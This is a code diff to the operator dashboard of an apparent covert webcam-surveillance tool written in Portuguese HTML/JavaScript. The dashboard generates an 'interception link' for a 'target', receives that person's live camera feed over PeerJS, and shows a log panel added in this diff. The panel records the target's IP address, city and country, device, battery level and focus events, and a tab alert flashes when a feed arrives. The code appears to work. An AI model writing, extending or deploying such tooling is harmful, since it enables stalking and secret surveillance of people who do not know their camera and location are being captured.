@@ -33,12 +33,25 @@
                 opacity: .5;
             }
         }
+
+        ::-webkit-scrollbar {
+            width: 6px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: #0f172a;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #334155;
+            border-radius: 4px;
+        }
     </style>
 </head>
 
 <body class="flex flex-col items-center justify-center min-h-screen p-4 md:p-8">
 
-    <div class="max-w-4xl w-full bg-slate-900 rounded-2xl p-6 shadow-2xl border border-slate-800 glitch-border">
+    <div class="max-w-5xl w-full bg-slate-900 rounded-2xl p-6 shadow-2xl border border-slate-800 glitch-border">
         <div class="flex justify-between items-center mb-6 border-b border-slate-800 pb-4">
             <h1 class="text-2xl font-bold tracking-tight text-sky-400">Terminal de Ligação P2P</h1>
             <div class="flex items-center gap-2 px-3 py-1 bg-slate-950 rounded-full border border-slate-800">
@@ -47,8 +60,8 @@
             </div>
         </div>
 
-        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
-            <div class="lg:col-span-1 space-y-4">
+        <div class="grid grid-cols-1 lg:grid-cols-4 gap-6">
+            <div class="lg:col-span-1 space-y-4 flex flex-col">
                 <div class="p-4 bg-slate-950 rounded-xl border border-slate-800">
                     <label class="block text-xs font-semibold text-slate-500 uppercase tracking-wider mb-2">Link de
                         Interceptação</label>
@@ -59,24 +72,22 @@
                         Link</button>
                 </div>
 
-                <div class="p-4 bg-slate-950 rounded-xl border border-slate-800">
-                    <label class="block text-xs font-semibold text-slate-500 uppercase tracking-wider mb-2">Controles
-                        Remotos</label>
+                <div class="p-4 bg-slate-950 rounded-xl border border-slate-800 flex-1 flex flex-col">
+                    <label class="block text-xs font-semibold text-slate-500 uppercase tracking-wider mb-2">Telemetria
+                        do Alvo</label>
+                    <div id="log-panel"
+                        class="flex-1 bg-slate-900 rounded border border-slate-800 p-3 text-[10px] font-mono text-slate-400 overflow-y-auto min-h-[200px] max-h-[300px] mb-4 space-y-1">
+                        <div>> Aguardando conexão...</div>
+                    </div>
                     <button id="btn-stop" onclick="encerrarConexao()" disabled
-                        class="w-full bg-red-900/50 hover:bg-red-600 text-red-200 px-4 py-3 rounded text-sm transition font-medium border border-red-800 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2">
-                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
-                                d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
-                                d="M9 10a1 1 0 011-1h4a1 1 0 011 1v4a1 1 0 01-1 1h-4a1 1 0 01-1-1v-4z"></path>
-                        </svg>
+                        class="w-full mt-auto bg-red-900/50 hover:bg-red-600 text-red-200 px-4 py-3 rounded text-sm transition font-medium border border-red-800 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2">
                         Encerrar Protocolo
                     </button>
                 </div>
             </div>
 
             <div
-                class="lg:col-span-2 relative w-full aspect-video bg-black rounded-xl overflow-hidden border border-slate-800 shadow-inner">
+                class="lg:col-span-3 relative w-full aspect-video bg-black rounded-xl overflow-hidden border border-slate-800 shadow-inner">
                 <video id="remote-video" class="w-full h-full object-cover transition-opacity duration-500 opacity-0"
                     autoplay playsinline></video>
 
@@ -95,6 +106,26 @@
     </div>
 
     <script>
+        const tituloOriginal = document.title;
+        let alertaPisca = null;
+
+        function ativarAlertaAba() {
+            if (document.hasFocus()) return;
+            let mostrarAlerta = true;
+            alertaPisca = setInterval(() => {
+                document.title = mostrarAlerta ? "🔴 [ SINAL DETECTADO ]" : tituloOriginal;
+                mostrarAlerta = !mostrarAlerta;
+            }, 1000);
+        }
+
+        window.addEventListener('focus', () => {
+            if (alertaPisca) {
+                clearInterval(alertaPisca);
+                alertaPisca = null;
+                document.title = tituloOriginal;
+            }
+        });
+
         const CHAVE_SESSAO = 'shield_agent_id';
         let myId = localStorage.getItem(CHAVE_SESSAO);
         if (!myId) {
@@ -111,7 +142,15 @@
             video: document.getElementById('remote-video'),
             overlay: document.getElementById('overlay-layer'),
             overlayText: document.getElementById('overlay-text'),
-            btnStop: document.getElementById('btn-stop')
+            btnStop: document.getElementById('btn-stop'),
+            logPanel: document.getElementById('log-panel')
+        };
+
+        const addLog = (key, value, isHighlight = false, isAlert = false) => {
+            const color = isAlert ? 'text-amber-400 font-bold' : (isHighlight ? 'text-sky-400 font-bold' : 'text-emerald-400');
+            const prefix = isAlert ? '⚠️' : '>';
+            ui.logPanel.innerHTML += `<div><span class="${isAlert ? 'text-amber-500' : 'text-slate-500'}">${prefix} ${key}:</span> <span class="${color}">${value}</span></div>`;
+            ui.logPanel.scrollTop = ui.logPanel.scrollHeight;
         };
 
         function setStatus(msg, colorClass) {
@@ -120,25 +159,38 @@
         }
 
         peer.on('open', (id) => {
-            setStatus("Sistema Online. Pronto para interceptação.", "bg-sky-500");
+            setStatus("Sistema Online.", "bg-sky-500");
             const baseUrl = window.location.href.replace('index.html', '').split('?')[0];
             document.getElementById('link-input').value = `${baseUrl}camera.html?target=${id}`;
         });
 
         peer.on('connection', (conn) => {
             conexaoDadosAtiva = conn;
+            conn.on('data', (data) => {
+                if (data.type === 'TARGET_INFO') {
+                    ui.logPanel.innerHTML += `<div class="mt-2 mb-1 border-b border-slate-700 pb-1 text-sky-500 font-bold">> ASSINATURA DETECTADA</div>`;
+                    addLog('IP', data.ip, true);
+                    addLog('Local', `${data.city}, ${data.region} (${data.country})`);
+                    addLog('Dispositivo', data.device, true);
+                    addLog('Bateria', data.battery);
+                } else if (data.type === 'TARGET_EVENT') {
+                    // Recebe eventos em tempo real (Foco/Bateria)
+                    addLog('EVENTO', data.message, false, true);
+                }
+            });
         });
 
         peer.on('call', (call) => {
             call.answer();
-            setStatus("Sinal detectado. Decodificando...", "bg-emerald-500");
+            setStatus("Sinal detectado.", "bg-emerald-500");
             ui.btnStop.disabled = false;
 
             call.on('stream', (remoteStream) => {
                 ui.video.srcObject = remoteStream;
                 ui.video.classList.remove('opacity-0');
                 ui.overlay.classList.add('opacity-0', 'pointer-events-none');
-                setStatus("Conexão Estabelecida.", "bg-emerald-500");
+                setStatus("Conexão Ativa.", "bg-emerald-500");
+                ativarAlertaAba();
             });
 
             call.on('close', resetarInterface);
@@ -148,13 +200,14 @@
             if (conexaoDadosAtiva) conexaoDadosAtiva.send({ command: 'KILL_SWITCH' });
             resetarInterface();
             setStatus("Protocolo encerrado.", "bg-red-500");
+            ui.logPanel.innerHTML += `<div class="text-red-400 mt-2">> Conexão cortada.</div>`;
         }
 
         function resetarInterface() {
             ui.video.srcObject = null;
             ui.video.classList.add('opacity-0');
             ui.overlay.classList.remove('opacity-0', 'pointer-events-none');
-            ui.overlayText.textContent = "Aguardando reconexão do alvo...";
+            ui.overlayText.textContent = "Aguardando reconexão...";
             ui.btnStop.disabled = true;
             setStatus("Aguardando feed.", "bg-amber-500");
         }
@@ -165,10 +218,7 @@
             document.execCommand('copy');
         }
 
-        // PROTOCOLO DE LIMPEZA: Destrói o ID no servidor antes de atualizar a página
-        window.addEventListener('beforeunload', () => {
-            if (peer) peer.destroy();
-        });
+        window.addEventListener('beforeunload', () => { if (peer) peer.destroy(); });
     </script>
 </body>
 
